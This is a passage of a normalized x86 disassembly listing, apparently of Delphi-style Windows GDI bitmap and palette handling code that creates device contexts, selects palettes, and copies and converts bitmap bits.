and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40f61c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_413844
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40f8a4
xor eax eax
push ebp
push sub_4138e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40fcf0
mov eax [ ebp - 0x8 ]
push eax
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_43ca0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fab8
retn
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_4138f4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40f8a4
xor eax eax
push ebp
push sub_4139f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_415090
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
call sub_41371c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_41514c
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
mov eax [ ebp - 0x8 ]
push eax
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fcf0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_43c958
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fab8
retn
sub_413a10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
call sub_44c070
sub_413a40
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41371c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x6c
call sub_448fa8
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
push eax
call CloseHandle
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_413ac0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_40db50
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_41371c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41371c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
call DeleteObject
sub_413b3c
push ebp
mov ebp esp
add esp 0xfffffbe4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x41c ]
mov ecx 0xff
mov eax [ ebp - 0x8 ]
call sub_410a70
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_413bff
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x41c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp - 0x14 ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov eax [ ebp - 0x14 ]
push eax
call DeleteDC
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_413c0c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x28 ] 0x3
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26 ] 0x20
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] 0xf800
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x7e0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x40 ] 0xff0000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0xff00
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] 0xff
sub_413c7c
push ebp
mov ebp esp
add esp 0xffffff60
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41371c
xor eax eax
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41016c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
push eax
call CreateCompatibleDC
call sub_41016c
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4142d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x90 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_44ba5c
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_413fcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_410048
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x28 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x1c ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x1c ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call CreateCompatibleBitmap
call sub_41016c
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41016c
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41016c
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41016c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_414281
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_414270
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x7c ] 0x0
jne r-xdata
xor eax eax
push ebp
push sub_41424e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call CreateDIBSection
call sub_41016c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_413c0c
mov eax [ ebp - 0x28 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_44bbe8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_410a70
jmp r-xdata
mov eax [ ebp - 0x28 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x28 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_40f3c0
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_43b7c8
lea eax [ ebp - 0xa0 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_40e410
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
call sub_40e410
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4100c0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x78 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414255
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
call CreateCompatibleDC
call sub_41016c
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_414224
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call SelectObject
call sub_41016c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x28 ]
call sub_44ba74
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x8c ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call GetDIBits
cmp [ ebp - 0x7c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x24 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_40e410
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
call sub_40e410
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x34 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x20 ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x88 ]
jne r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x20 ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_40e410
push eax
mov eax [ ebp - 0x24 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_40f36c
call sub_40e410
push eax
mov eax [ ebp - 0x24 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
jmp r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call SelectObject
call sub_41016c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
push eax
call DeleteDC
retn
push 0xffffffff
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call GetDIBits
call sub_44c848
call sub_44c848
jmp r-xdata
sub_414277
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_414286
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_44c7c4
call sub_44c818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4142e4
push ebp
mov ebp esp
add esp 0xfffffbf0
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x410 ] 0x300
mov ax [ ebp - 0xc ]
mov [ ebp - 0x40e ] ax
lea eax [ ebp - 0x40c ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetPaletteEntries
lea eax [ ebp - 0x410 ]
push eax
call CreatePalette
mov [ ebp - 0x8 ] eax
sub_41435c
push ebp
mov ebp esp
add esp 0xffffff80
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x80 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41371c
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_414577
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41016c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleDC
call sub_41016c
mov [ ebp - 0x1c ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x7c ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0xc ] 0x1fffffff
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleDC
call sub_41016c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41452f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x6c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x7c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x21 ] 0x0
mov [ ebp - 0x21 ] 0x1
xor eax eax
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x80 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413c7c
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x7c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SetBkColor
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectPalette
mov eax [ ebp - 0x18 ]
push eax
call RealizePalette
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_414588
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4115f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a00
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_414604
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_415070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43ccd0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_414654
push ebp
mov ebp esp
add esp 0xffffffa4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41471d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x54
call sub_44bd90
lea eax [ ebp - 0x5c ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_415324
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
call sub_413a00
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x19 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x19 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] al
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_414754
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x68 ]
push ecx
mov ecx 0x15
